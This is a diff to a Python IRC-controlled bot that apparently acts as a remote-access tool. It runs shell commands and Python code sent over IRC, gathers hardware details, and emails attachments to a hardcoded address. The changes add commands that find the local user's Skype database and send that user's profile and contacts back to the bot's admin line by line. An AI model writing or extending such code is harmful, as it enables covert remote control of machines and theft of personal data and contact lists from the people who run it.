@@ -15,7 +15,7 @@ from time import strftime, sleep
 from StringIO import StringIO
 import skype
 
-version = "2.0.3"                                                 # bot version
+version = "2.0.4"                                                 # bot version
 
 def log(prefix, content=''):                                      # function used to log things to the console with a timestamp
     try:
@@ -59,7 +59,8 @@ Public Commands (main channel): \n
  7. $<command>                                                    #-- run <command> in shell and capture live output \n
  8. >>><python>                                                   #-- eval/exec python live in the bot script \n
  9. email$                                                        #-- send an email with attachments listed after $ \n
- 9. skype$                                                        #-- get skype profile of skype user after $ \n''' % version
+ 9. skype$profile                                                 #-- get skype profile of main user \n
+ 9. skype$contacts                                                #-- get skype contacts of main user \n''' % version
 
 ############ Flow functions
 
@@ -95,8 +96,9 @@ def privscan(match):                                              # function to 
         return header.find(':%s!' % admin) != -1                  # checks to make sure private message is from admin
 
 def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
+    if type(msg) is not int:
+        msg = str(msg)
     log('[+] Sent Data:')
-    msg = str(msg)
     if (len(msg) > 480) or (msg.find('\n') != -1):
         log('[#] Starting multiline output.')
         msgs = line_split(msg, 480)                               # use line_split to split output into multiple lines based on max message length (480)
@@ -324,7 +326,7 @@ def full_identify():                                              # give verbose
     p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
     hardware = p.stdout.read()
     log('[>]    Hardware.')
-    privmsg(hardware)
+    privmsg(str(hardware))
     
     privmsg('[√] Done.')
 
@@ -417,11 +419,19 @@ if __name__ == '__main__':
                 to = "nikisweeting+bot@gmail.com"
                 broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
 
-            elif privscan('skype$'):
-                skype_user = data.split("$", 1)[1].strip()
-                db_path = "/Users/%s/Library/Application Support/Skype/%s/main.db" % (main_user, skype_user)
+            elif privscan('skype$profile'):
+                db_path = skype.findProfile(local_user)
                 for line in skype.printProfile(db_path):
                     privmsg(line)
+
+            elif privscan('skype$contacts'):
+                db_path = skype.findProfile(local_user)
+                for line in skype.printProfile(db_path):
+                    privmsg(line)
+                    sleep(1)
+                for line in skype.printContacts(db_path):
+                    privmsg(line)
+                    sleep(1)
 
             elif scan('$'):
                 cmd = data.split("$", 1)[1]
